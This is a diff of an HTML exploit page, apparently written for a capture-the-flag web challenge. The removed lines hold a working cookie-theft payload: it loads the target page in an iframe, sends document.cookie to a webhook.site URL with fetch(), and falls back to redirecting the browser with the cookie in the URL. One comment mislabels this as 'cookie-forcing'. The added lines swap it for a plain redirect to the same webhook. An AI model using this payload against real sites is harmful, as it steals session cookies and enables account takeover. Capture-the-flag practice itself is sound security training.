@@ -1,35 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Exploit</title>
-</head>
 <body>
   <script>
-    // The most reliable way to steal cookies in this scenario is using an XHR request with credentials
-    // and then posting the response to our webhook
-    
-    // Create an iframe pointing to the challenge page
-    const iframe = document.createElement('iframe');
-    
-    // This will navigate to the root page of the challenge domain
-    iframe.src = '/';
-    iframe.onload = function() {
-      // Once loaded, try to access the content and extract cookies
-      try {
-        // Send the cookies to our webhook
-        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?leaked=' + encodeURIComponent(document.cookie));
-      } catch(e) {
-        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?error=' + encodeURIComponent(e.toString()));
-      }
-    };
-    
-    document.body.appendChild(iframe);
-    
-    // As a backup approach, try to force a navigation that includes the cookie in the URL
-    // This is known as a "cookie-forcing attack"
-    setTimeout(() => {
-      location = 'https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24/flag?c=' + document.cookie;
-    }, 1000);
+    // Simple redirect
+    document.location = 'https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?visited=true';
   </script>
 </body>
 </html>
